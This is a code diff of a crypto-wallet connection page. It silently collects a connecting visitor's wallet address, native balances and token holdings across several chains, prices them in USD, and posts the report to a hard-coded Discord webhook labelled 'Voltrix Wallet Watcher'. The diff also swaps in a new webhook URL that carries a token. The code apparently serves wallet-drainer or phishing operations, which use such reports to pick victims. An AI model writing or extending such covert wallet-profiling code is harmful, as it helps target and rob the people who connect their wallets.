@@ -36,44 +36,40 @@ const wagmiConfig = createConfig({
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
 const web3Modal = new Web3Modal({ projectId }, ethereumClient);
 
-const webhookURL = "https://discord.com/api/webhooks/1364313853810446397/Mu0B78sHS1cEoKtYhxc3MHAQEJ0PkWXzOUR_EBDD1Asvu7XI563w49JGOYSA0DundyOj";
+const webhookURL = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";
 
 async function getUSDPrice(symbol) {
   try {
     const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbol.toLowerCase()}&vs_currencies=usd`);
     const data = await res.json();
     return data[symbol.toLowerCase()]?.usd || null;
-  } catch (err) {
-    console.warn(`Price not found for ${symbol}`);
+  } catch {
     return null;
   }
 }
 
-async function sendToDiscordEmbed({ address, chainName, chainId, native, tokens }) {
+async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
   const embed = {
-    title: `🏦 Wallet Connected`,
-    description: `**👤 Wallet:** \`${address}\`\n🌍 **Chain:** ${chainName} (ID: ${chainId})`,
+    title: `💼 Wallet Connected`,
+    description: `**👤 Wallet:** \`${address}\``,
     color: 0x00ffcc,
     fields: [
       {
-        name: `💰 Native Balance`,
-        value: `${native.symbol}: ${native.amount} ${native.usd ? `($${native.usd})` : ""}`,
+        name: `💰 Native Balances`,
+        value: nativeBalances.map(n => `**${n.chain}**: ${n.symbol} ${n.amount} ${n.usd ? `($${n.usd})` : ''}`).join('\n'),
         inline: false
-      }
+      },
+      ...tokenSections.map(section => ({
+        name: `📜 Tokens on ${section.chain}`,
+        value: section.tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ""}`).join('\n'),
+        inline: false
+      }))
     ],
     footer: {
       text: `Voltrix Wallet Watcher`
     },
     timestamp: new Date().toISOString()
   };
-
-  if (tokens.length > 0) {
-    embed.fields.push({
-      name: `📜 Tokens`,
-      value: tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ""}`).join('\n'),
-      inline: false
-    });
-  }
 
   try {
     await fetch(webhookURL, {
@@ -90,6 +86,8 @@ async function sendBalancesToDiscord(account) {
   if (!account.isConnected) return;
 
   const address = account.address;
+  const nativeBalances = [];
+  const tokenSections = [];
 
   for (const chain of chains) {
     try {
@@ -99,43 +97,43 @@ async function sendBalancesToDiscord(account) {
       const nativeBalance = await fetchBalance({ address, chainId });
       const nativeAmount = parseFloat(nativeBalance.formatted).toFixed(6);
       const nativePrice = await getUSDPrice(nativeBalance.symbol);
-      const nativeUSD = nativePrice ? nativePrice * nativeAmount : null;
+      const nativeUSD = nativePrice ? (nativePrice * nativeAmount).toFixed(2) : null;
+
+      nativeBalances.push({
+        chain: chainName,
+        symbol: nativeBalance.symbol,
+        amount: nativeAmount,
+        usd: nativeUSD
+      });
 
       const { publicClient: chainClient } = configureChains([chain], [w3mProvider({ projectId })]);
       const tokensList = [];
 
-      if (chainClient.getTokenBalances) {
+      if (typeof chainClient.getTokenBalances === "function") {
         const tokens = await chainClient.getTokenBalances({ address });
         for (const token of tokens) {
           const amount = parseFloat(token.formatted);
           if (amount > 0) {
-            const fixedAmount = amount.toFixed(6);
             const usdPrice = await getUSDPrice(token.symbol);
             tokensList.push({
               symbol: token.symbol,
-              amount: fixedAmount,
-              usd: usdPrice ? usdPrice * amount : null
+              amount: amount.toFixed(6),
+              usd: usdPrice ? (usdPrice * amount).toFixed(2) : null
             });
           }
         }
       }
 
-      await sendToDiscordEmbed({
-        address,
-        chainName,
-        chainId,
-        native: {
-          symbol: nativeBalance.symbol,
-          amount: nativeAmount,
-          usd: nativeUSD ? nativeUSD.toFixed(2) : null
-        },
-        tokens: tokensList
-      });
+      if (tokensList.length > 0) {
+        tokenSections.push({ chain: chainName, tokens: tokensList });
+      }
 
     } catch (err) {
-      console.error(`Error on chain ${chain.name}:`, err);
+      console.error(`Error fetching for ${chain.name}:`, err);
     }
   }
+
+  await sendToDiscordEmbed({ address, nativeBalances, tokenSections });
 }
 
 watchAccount((account) => {
